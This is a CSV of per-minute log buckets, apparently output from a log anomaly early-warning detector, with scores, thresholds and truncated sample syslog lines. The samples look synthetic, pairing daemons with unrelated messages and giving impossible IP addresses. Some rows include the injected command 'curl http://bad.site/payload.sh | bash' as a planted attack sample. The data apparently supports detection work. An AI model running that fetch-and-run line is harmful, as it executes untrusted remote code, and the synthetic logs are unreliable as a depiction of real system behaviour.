bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 00:31:00,0.9996784761260871,1,1,0.8224995273096307,3,60,docker: Started Cleanup of Temporary Directories. || dockerd: Started CUPS Scheduler. || docker: Listening on LVM2 poll daemon socket. || systemd: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || unattended-u
2026-07-01 00:32:00,0.9999713846469094,1,1,0.8224995273096307,3,65,docker: Listening on LVM2 poll daemon socket. || telnetd: Started Session c187 of user root. || unix_chkpwd: Finished Daily apt download activities. || CRON: Started Session c153 of user root. || dockerd: Rotating log files. || systemd: Finished Dail
2026-07-01 00:33:00,0.9996085217199862,1,1,0.8224995273096307,3,59,ftpd: Synced RTC time from system clock. || dockerd: Accepted publickey for user from 10.0.0.135 port 22 ssh2. || ftpd: Listening on LVM2 poll daemon socket. || redis-server: Started Cleanup of Temporary Directories. || CRON: Started Session c232 of 
2026-07-01 00:34:00,0.9948551210549867,1,1,0.8224995273096307,3,63,sudo: Accepted publickey for user from 10.0.0.246 port 22 ssh2. || logrotate: Rotating log files. || unix_chkpwd: Started Session c29 of user root. || ufw: Rotating log files. || ntpd: Started CUPS Scheduler. || smartd: Started Session c25 of user ro
2026-07-01 00:35:00,0.9957778674012382,1,1,0.8224995273096307,3,59,ntpd: Started CUPS Scheduler. || telnetd: Synced RTC time from system clock. || systemd-timesyncd: Finished Daily apt download activities. || rsyslogd: Started Session c163 of user root. || docker: Accepted publickey for user from 10.0.0.173 port 22 
2026-07-01 00:36:00,0.9996794115302247,1,1,0.8224995273096307,3,59,ufw: Started Session c187 of user root. || unix_chkpwd: Started CUPS Scheduler. || sudo: Rotating log files. || ntpd: Synced RTC time from system clock. || CRON: Started CUPS Scheduler. || rsyslogd: Started Cleanup of Temporary Directories. || telnet
2026-07-01 00:37:00,0.9998511109424274,1,1,0.8224995273096307,3,61,unattended-upgrades: Started Session c79 of user root. || unattended-upgrades: Started CUPS Scheduler. || kernel: Started Cleanup of Temporary Directories. || unattended-upgrades: Listening on LVM2 poll daemon socket. || named: Started CUPS Scheduler
2026-07-01 00:38:00,0.9997216034415664,1,1,0.8224995273096307,3,59,dockerd: Accepted publickey for user from 10.0.0.24 port 22 ssh2. || dockerd: Started Session c222 of user root. || docker: Started Cleanup of Temporary Directories. || rsyslogd: Started Cleanup of Temporary Directories. || dockerd: Started Session c
2026-07-01 00:39:00,0.9993742620101249,1,1,0.8224995273096307,3,63,unattended-upgrades: Started Cleanup of Temporary Directories. || logrotate: Started Session c13 of user root. || gpm: Rotating log files. || sudo: Started Session c4 of user root. || xinetd: Rotating log files. || CRON: Started CUPS Scheduler. || xi
2026-07-01 00:40:00,0.9994815589984716,1,1,0.8224995273096307,3,60,named: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || rsyslogd: Synced RTC time from system clock. || ftpd: Finished Daily apt download activities. || gpm: Finished Daily apt download activities. || systemd
2026-07-01 00:41:00,0.9998764633322288,1,1,0.8224995273096307,3,62,gpm: Finished Daily apt download activities. || xinetd: Accepted publickey for user from 10.0.0.174 port 22 ssh2. || unattended-upgrades: Synced RTC time from system clock. || kernel: Synced RTC time from system clock. || systemd: Finished Daily apt 
2026-07-01 00:42:00,0.9998836009485244,1,1,0.8224995273096307,3,58,xinetd: Started CUPS Scheduler. || named: bash: -c: line 1: curl http://bad.site/payload.sh | bash || smartd: Listening on LVM2 poll daemon socket. || systemd: Accepted publickey for user from 10.0.0.184 port 22 ssh2. || cups: Started Session c158 of
2026-07-01 00:43:00,0.9989669384257199,1,1,0.8224995273096307,3,61,sshd: Started Session c2 of user root. || sshd: Listening on LVM2 poll daemon socket. || redis-server: Started Cleanup of Temporary Directories. || rsyslogd: Started Session c28 of user root. || systemd: Started CUPS Scheduler. || systemd: Synced RTC
2026-07-01 00:44:00,0.9985171584999407,1,1,0.8224995273096307,3,61,ftpd: Accepted publickey for user from 10.0.0.178 port 22 ssh2. || NetworkManager: Synced RTC time from system clock. || unattended-upgrades: Rotating log files. || ntpd: Started CUPS Scheduler. || smartd: Listening on LVM2 poll daemon socket. || gpm
2026-07-01 00:45:00,0.9992802137943512,1,1,0.8224995273096307,3,60,docker: Started CUPS Scheduler. || docker: Rotating log files. || sudo: Failed password for invalid user test from 192.168.1.54593 port 22 ssh2 || rsyslogd: Rotating log files. || smartd: Started Cleanup of Temporary Directories. || dockerd: Listenin
2026-07-01 00:46:00,0.9979957867148744,1,1,0.8224995273096307,3,63,redis-server: Rotating log files. || smartd: Started CUPS Scheduler. || unix_chkpwd: Rotating log files. || ntpd: Started Cleanup of Temporary Directories. || systemd: Accepted publickey for user from 10.0.0.17 port 22 ssh2. || rsyslogd: kernel: Out 
2026-07-01 00:47:00,0.9991390410163784,1,1,0.8224995273096307,3,61,gpm: Started Session c250 of user root. || NetworkManager: Accepted publickey for user from 10.0.0.190 port 22 ssh2. || ufw: Finished Daily apt download activities. || redis-server: Rotating log files. || unattended-upgrades: Started CUPS Scheduler. 
2026-07-01 00:48:00,0.9995392520852913,1,1,0.8224995273096307,3,60,unix_chkpwd: Started CUPS Scheduler. || named: Failed password for invalid user test from 192.168.1.555 port 22 ssh2 || CRON: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started CUPS Scheduler. || redis-server: Started CUPS Scheduler. || un
2026-07-01 00:49:00,0.9999650061970318,1,1,0.8224995273096307,3,61,unattended-upgrades: Listening on LVM2 poll daemon socket. || dockerd: Finished Daily apt download activities. || xinetd: Listening on LVM2 poll daemon socket. || redis-server: Started Session c10 of user root. || CRON: Listening on LVM2 poll daemon 
2026-07-01 00:50:00,0.9999802315411624,1,1,0.8224995273096307,3,61,CRON: Started Cleanup of Temporary Directories. || gpm: Started Cleanup of Temporary Directories. || named: Rotating log files. || sudo: Finished Daily apt download activities. || cups: Started Cleanup of Temporary Directories. || telnetd: Accepted p
2026-07-01 00:51:00,0.9999864388031802,1,1,0.8224995273096307,3,61,docker: Listening on LVM2 poll daemon socket. || chronyd: Synced RTC time from system clock. || ftpd: Synced RTC time from system clock. || systemd-timesyncd: Started Cleanup of Temporary Directories. || xinetd: Synced RTC time from system clock. || 
2026-07-01 00:52:00,0.9997253453367045,1,1,0.8224995273096307,3,61,ntpd: Accepted publickey for user from 10.0.0.40 port 22 ssh2. || kernel: bash: -c: line 1: curl http://bad.site/payload.sh | bash || systemd-timesyncd: Started CUPS Scheduler. || ufw: Accepted publickey for user from 10.0.0.43 port 22 ssh2. || docke
2026-07-01 00:53:00,0.9998522464807553,1,1,0.8224995273096307,3,63,gpm: Started Session c11 of user root. || kernel: Rotating log files. || kernel: Started CUPS Scheduler. || systemd: kernel: Kernel panic - not syncing: Fatal exception || dockerd: Started Session c154 of user root. || smartd: Accepted publickey for 
2026-07-01 00:54:00,0.9998674834357951,1,1,0.8224995273096307,3,63,systemd-timesyncd: Started CUPS Scheduler. || chronyd: Synced RTC time from system clock. || ntpd: Started Cleanup of Temporary Directories. || logrotate: Finished Daily apt download activities. || chronyd: Started CUPS Scheduler. || logrotate: Liste
2026-07-01 00:55:00,0.998987641368798,1,1,0.8224995273096307,3,63,unix_chkpwd: Started Cleanup of Temporary Directories. || ntpd: Listening on LVM2 poll daemon socket. || ntpd: Rotating log files. || cups: Rotating log files. || kernel: Started Session c143 of user root. || telnetd: Finished Daily apt download acti
2026-07-01 00:56:00,0.9963529432091245,1,1,0.8224995273096307,3,60,ftpd: Started Session c43 of user root. || named: Synced RTC time from system clock. || gpm: Started Cleanup of Temporary Directories. || sshd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.62721 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || unix_chkpwd
2026-07-01 00:57:00,0.9982817582937273,1,1,0.8224995273096307,3,60,systemd-timesyncd: Started Session c13 of user root. || sudo: Rotating log files. || cups: kernel: Out of memory: Kill process 5812 (python3) score 987 or sacrifice child || sshd: Accepted publickey for user from 10.0.0.152 port 22 ssh2. || systemd-t
2026-07-01 00:58:00,0.9982301103680559,1,1,0.8224995273096307,3,60,ufw: Finished Daily apt download activities. || cups: Synced RTC time from system clock. || sudo: Started Cleanup of Temporary Directories. || redis-server: Rotating log files. || kernel: Started CUPS Scheduler. || systemd: Started Cleanup of Tempora
2026-07-01 00:59:00,0.9815121215787447,1,1,0.8224995273096307,3,56,unix_chkpwd: Synced RTC time from system clock. || ftpd: Rotating log files. || xinetd: Synced RTC time from system clock. || named: Started Session c41 of user root. || logrotate: Started CUPS Scheduler. || systemd: Started Cleanup of Temporary Dire
2026-07-01 01:00:00,0.9773880936624999,1,1,0.8224995273096307,3,61,gpm: Accepted publickey for user from 10.0.0.128 port 22 ssh2. || systemd-timesyncd: Synced RTC time from system clock. || named: Started CUPS Scheduler. || unix_chkpwd: Synced RTC time from system clock. || systemd: Accepted publickey for user from 
2026-07-01 01:01:00,0.9911659793533153,1,1,0.8224995273096307,3,60,unattended-upgrades: Started CUPS Scheduler. || redis-server: Accepted publickey for user from 10.0.0.202 port 22 ssh2. || gpm: Accepted publickey for user from 10.0.0.177 port 22 ssh2. || chronyd: Listening on LVM2 poll daemon socket. || chronyd: Li
2026-07-01 01:02:00,0.9983765345252762,1,1,0.8224995273096307,3,61,NetworkManager: Rotating log files. || docker: Synced RTC time from system clock. || chronyd: Synced RTC time from system clock. || gpm: Rotating log files. || NetworkManager: Synced RTC time from system clock. || rsyslogd: Started Cleanup of Tempora
2026-07-01 01:03:00,0.9998708993988574,1,1,0.8224995273096307,3,60,sshd: Synced RTC time from system clock. || unattended-upgrades: Accepted publickey for user from 10.0.0.214 port 22 ssh2. || ntpd: Accepted publickey for user from 10.0.0.55 port 22 ssh2. || ntpd: Started Cleanup of Temporary Directories. || chronyd
2026-07-01 01:04:00,0.9996356704642642,1,1,0.8224995273096307,3,64,sshd: Accepted publickey for user from 10.0.0.88 port 22 ssh2. || CRON: Finished Daily apt download activities. || ftpd: Started Cleanup of Temporary Directories. || named: Started Cleanup of Temporary Directories. || redis-server: Rotating log files
2026-07-01 01:05:00,0.9999594097070389,1,1,0.8224995273096307,3,60,unattended-upgrades: Started CUPS Scheduler. || systemd: Accepted publickey for user from 10.0.0.252 port 22 ssh2. || unattended-upgrades: Started Session c244 of user root. || redis-server: Started CUPS Scheduler. || named: Started Session c193 of u
2026-07-01 01:06:00,0.9999782573995661,1,1,0.8224995273096307,3,60,telnetd: Started Session c131 of user root. || ufw: Rotating log files. || rsyslogd: Started Cleanup of Temporary Directories. || named: Rotating log files. || systemd-timesyncd: Accepted publickey for user from 10.0.0.160 port 22 ssh2. || redis-serv
2026-07-01 01:07:00,0.9999878993000305,1,1,0.8224995273096307,3,60,ufw: Accepted publickey for user from 10.0.0.103 port 22 ssh2. || unattended-upgrades: Started Cleanup of Temporary Directories. || kernel: Accepted publickey for user from 10.0.0.89 port 22 ssh2. || ftpd: Rotating log files. || ftpd: Started CUPS Sc
2026-07-01 01:08:00,0.9999229714531395,1,1,0.8224995273096307,3,59,logrotate: Rotating log files. || ftpd: Synced RTC time from system clock. || rsyslogd: Listening on LVM2 poll daemon socket. || kernel: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || redis-server: Started Cleanup of Te
2026-07-01 01:09:00,0.9999350713266842,1,1,0.8224995273096307,3,62,sshd: Listening on LVM2 poll daemon socket. || gpm: Synced RTC time from system clock. || kernel: Rotating log files. || sudo: Accepted publickey for user from 10.0.0.94 port 22 ssh2. || redis-server: Synced RTC time from system clock. || logrotate: 
2026-07-01 01:10:00,0.9999201754770018,1,1,0.8224995273096307,3,61,systemd: Synced RTC time from system clock. || docker: Started CUPS Scheduler. || dockerd: Rotating log files. || kernel: Accepted publickey for user from 10.0.0.140 port 22 ssh2. || dockerd: Synced RTC time from system clock. || ftpd: Synced RTC tim
2026-07-01 01:11:00,0.999521633101912,1,1,0.8224995273096307,3,58,cups: Finished Daily apt download activities. || NetworkManager: Synced RTC time from system clock. || CRON: Listening on LVM2 poll daemon socket. || NetworkManager: Started Cleanup of Temporary Directories. || sshd: Accepted publickey for user from 
2026-07-01 01:12:00,0.9925272006267012,1,1,0.8224995273096307,3,60,unix_chkpwd: Started Session c158 of user root. || kernel: bash: -c: line 1: curl http://bad.site/payload.sh | bash || systemd: Started Session c243 of user root. || named: Rotating log files. || sshd: Listening on LVM2 poll daemon socket. || named: 
2026-07-01 01:13:00,0.9998469224513556,1,1,0.8224995273096307,3,63,logrotate: Listening on LVM2 poll daemon socket. || smartd: Started Session c141 of user root. || unix_chkpwd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || rsyslogd: Finished Daily apt download activities.
2026-07-01 01:14:00,0.9998151138557678,1,1,0.8224995273096307,3,60,ftpd: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || xinetd: Started Cleanup of Temporary Directories. || unattended-upgrades: Started Cleanup of Temporary Directories. || telnetd: Synced RTC time from sy
2026-07-01 01:15:00,0.9998764418815491,1,1,0.8224995273096307,3,63,unix_chkpwd: Finished Daily apt download activities. || cups: Listening on LVM2 poll daemon socket. || kernel: Started Session c171 of user root. || NetworkManager: Finished Daily apt download activities. || systemd-timesyncd: [UFW BLOCK] IN=eth0 OUT
2026-07-01 01:16:00,0.9995605009928629,1,1,0.8224995273096307,3,57,systemd-timesyncd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || xinetd: Started Session c129 of user root. || unattended-upgrades: Started Session c124 of user root. || chronyd: Synced RTC time from system
2026-07-01 01:17:00,0.999778209154106,1,1,0.8224995273096307,3,63,docker: Synced RTC time from system clock. || telnetd: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || cups: Rotating log files. || gpm: Started Cleanup of Temporary Directories. || cups: Synced RTC time from system clock. || chronyd: St
2026-07-01 01:18:00,0.9999043694457533,1,1,0.8224995273096307,3,59,unix_chkpwd: kernel: Out of memory: Kill process 57201 (python3) score 987 or sacrifice child || gpm: Finished Daily apt download activities. || smartd: Started Cleanup of Temporary Directories. || ntpd: Rotating log files. || systemd-timesyncd: Sync
2026-07-01 01:19:00,0.9998349823271158,1,1,0.8224995273096307,3,61,named: kernel: Out of memory: Kill process 12083 (python3) score 987 or sacrifice child || xinetd: Started Cleanup of Temporary Directories. || smartd: kernel: Kernel panic - not syncing: Fatal exception || systemd-timesyncd: Finished Daily apt downl
2026-07-01 01:20:00,0.9994154612267393,1,1,0.8224995273096307,3,60,ntpd: Rotating log files. || NetworkManager: Started Cleanup of Temporary Directories. || smartd: Started CUPS Scheduler. || kernel: Finished Daily apt download activities. || dockerd: Finished Daily apt download activities. || gpm: Finished Daily ap
2026-07-01 01:21:00,0.999349163002234,1,1,0.8224995273096307,3,61,ntpd: Accepted publickey for user from 10.0.0.172 port 22 ssh2. || smartd: Started CUPS Scheduler. || xinetd: Listening on LVM2 poll daemon socket. || kernel: Listening on LVM2 poll daemon socket. || sshd: Accepted publickey for user from 10.0.0.191 
2026-07-01 01:22:00,0.9996623351083532,1,1,0.8224995273096307,3,60,xinetd: Started CUPS Scheduler. || logrotate: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.20718 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || sshd: Finished Daily apt download activities. || systemd: Accepted publickey for user from 10.0.0.180 port 22
2026-07-01 01:23:00,0.9990331685261667,1,1,0.8224995273096307,3,63,smartd: Started Cleanup of Temporary Directories. || sudo: Listening on LVM2 poll daemon socket. || xinetd: Started Cleanup of Temporary Directories. || dockerd: Listening on LVM2 poll daemon socket. || CRON: Started Cleanup of Temporary Directories.
2026-07-01 01:24:00,0.9995765776208275,1,1,0.8224995273096307,3,58,named: Started CUPS Scheduler. || ftpd: Synced RTC time from system clock. || redis-server: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.23836 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || kernel: Started CUPS Scheduler. || chronyd: Rotating log files.
2026-07-01 01:25:00,0.9999160834727596,1,1,0.8224995273096307,3,61,systemd-timesyncd: Started Cleanup of Temporary Directories. || gpm: Started CUPS Scheduler. || redis-server: Synced RTC time from system clock. || CRON: Accepted publickey for user from 10.0.0.18 port 22 ssh2. || ntpd: Finished Daily apt download ac
2026-07-01 01:26:00,0.9998813600527429,1,1,0.8224995273096307,3,58,sshd: Started Session c251 of user root. || unattended-upgrades: Listening on LVM2 poll daemon socket. || CRON: Rotating log files. || xinetd: Started Session c242 of user root. || ufw: Finished Daily apt download activities. || named: Finished Daily
2026-07-01 01:27:00,0.9998847304900144,1,1,0.8224995273096307,3,63,docker: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || sshd: Listening on LVM2 poll daemon socket. || dockerd: Started CUPS Scheduler. || telnetd: Failed password for invalid user test from 192.168
2026-07-01 01:28:00,0.9999217273107,1,1,0.8224995273096307,3,61,CRON: Accepted publickey for user from 10.0.0.171 port 22 ssh2. || dockerd: Rotating log files. || xinetd: Started Session c228 of user root. || sudo: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 ||
2026-07-01 01:29:00,0.9996891447227075,1,1,0.8224995273096307,3,59,ufw: Listening on LVM2 poll daemon socket. || dockerd: Accepted publickey for user from 10.0.0.160 port 22 ssh2. || sshd: Finished Daily apt download activities. || unix_chkpwd: Started CUPS Scheduler. || chronyd: Started Cleanup of Temporary Directo
2026-07-01 01:30:00,0.9998644799695695,1,1,0.8224995273096307,3,59,NetworkManager: Finished Daily apt download activities. || chronyd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started Cleanup of Temporary Directories. || named: Finished Daily apt download activities. || sshd: Accepted publickey fo
2026-07-01 01:31:00,0.9998234854158772,1,1,0.8224995273096307,3,60,kernel: Rotating log files. || kernel: Started Session c154 of user root. || gpm: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || kernel: Started Session c222 of user root. || xinetd: Started Cleanup of Temporary Di
2026-07-01 01:32:00,0.9984566939759362,1,1,0.8224995273096307,3,62,dockerd: Accepted publickey for user from 10.0.0.44 port 22 ssh2. || NetworkManager: Listening on LVM2 poll daemon socket. || named: Started Session c63 of user root. || named: Started CUPS Scheduler. || xinetd: Started CUPS Scheduler. || NetworkMana
